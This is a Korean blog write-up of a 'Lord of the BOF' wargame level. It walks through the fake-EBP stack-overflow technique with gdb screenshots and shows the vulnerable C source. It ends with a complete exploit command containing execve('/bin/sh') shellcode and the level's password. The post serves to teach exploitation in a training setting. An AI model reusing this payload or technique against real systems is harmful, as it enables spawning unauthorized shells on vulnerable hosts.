---
layout: single
title: "LOB 16번 (assassin -> zombie_assassin)"
#description: ""
date: 2016-02-05 12:00:00 -0400
# modified: 
tags: 
- wargame
- writeup
- pwnable
- lob
comments: true
share: true
---

source code:

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - zombie_assassin
        - FEBP
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] == '\xbf')
        {
                printf("stack retbayed you!\n");
                exit(0);
        }

        if(argv[1][47] == '\x40')
        {
                printf("library retbayed you, too!!\n");
                exit(0);
        }

        // strncpy instead of strcpy!
        strncpy(buffer, argv[1], 48);
        printf("%s\n", buffer);
}
```

Stack frame structure:

| buffer[40] |
| SFP |
| RET |
| argc |
| argv |
| environ |

문제에서 FEBP, fake EBP라는 힌트를 주었다. fake EBP는 golem -> darkknight 문제에서 한번 언급된 바 있다.
fake EBP는 ebp를 통해 eip를 조작하는 기법이다. 이를 알아보기 위해 실험을 해 보았다.

![disas]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-16/0.png)

disas main 명령어를 통해 leave를 하는 위치를 찾았다. leave ret을 하나씩 실행하고 경과를 지켜보기 위해 이 자리에 breakpoint를 걸고 차근차근 실행해 보았다.

![info_register]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-16/1.png)

A 40개는 buffer 40바이트, BBBB는 stack frame pointer, CCCC는 return 자리이다. 뒤의 D 200개는 padding과 쉘을 위치시킬 것을 고려해 입력해 보았다. 여기까지는 leave를 하기 전이다.

![memory]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-16/2.png)

![memory2]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-16/3.png)

buffer와 argv 자리에 위치하고 있는 입력값들의 위치를 찾아 두었다. 그리고 si 명령어로 leave를 해 보았다.

![info_register2]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-16/4.png)

ebp에 BBBB인 42424242가 위치해 있는 것을 볼 수 있다. 여기에서 leave 이후의 ret까지 실행시켜 보았다.

![info_register3]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-16/5.png)

eip가 BBBB 뒤의 값인 CCCC(43434343)으로 바뀐 것을 볼 수 있다. 원래 0x43434343 자리에는 다음에 실행할 명령어의 위치가 들어 있어야 할 것이다. 이제 CCCC(ret 위치) 대신 leave의 주소인 0x080484df를 입력하고, BBBB 자리에 적당한 주소로 bffffba0를 입력해 보았다.

![info_register4]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-16/6.png)

이전과 동일한 실행지점까지 실행시켜 보았다. eip가 080484df, ebp가 bffffba0으로 바뀌었다. 여기에서 한 줄 더 실행시켜 보았다.

![info_register5]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-16/7.png)

eip가 ret인 080484e0로 바뀌고 ebp는 이전에 bffffba0에 들어있는 값인 44444444로 바뀌었다. 여기에서 한줄 더 실행시켜 보았다.

![info_register6]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-16/8.png)

eip마저 44444444로 바뀌었다. 이는 ebp+4에 위치하고 있는 값이었을 것이다. 일련의 과정들을 통해 fake EBP를 다음과 같이 정리해 볼 수 있다.
본래의 SFP 자리에 어떤 주소지를 입력하고 ret 자리에 leave의 주소를 입력하면, SFP 자리에 입력된 주소지가 ebp가 되고, 거기서 4만큼 증가된 자리에 들어있는 주소지가 eip가 된다.
이를 바탕으로 페이로드를 다음과 같이 작성하였다.

```bash

./zombie_assassin `python –c ‘print “\xa0\xfb\xff\xbf”*10 + “\xd0\xf9\xff\xbf” + “\xdf\x84\x04\x08” + “\x90”*100 + “\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80” + “\x90”*75’`

```

1.	ret가 leave를 가리킴으로써 eip가 ret에 들어있는 주소값(\xdf\x84\x04\x08)으로 바뀐다.
2.	ebp가 SFP가 가리키는 주소(\xd0\xf9\xff\xbf)로 바뀐다.
3.	ebp가 SFP에 들어있는 주소가 가리키는 값(\xa0\xfb\xff\xbf)으로 바뀌고, +4가 된 주소에 들어있는 값이 eip에 담긴다.
4.	eip가 \x90” * 100 + shellcode를 실행

![exploit]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-16/9.png)


my-pass: no place to hide
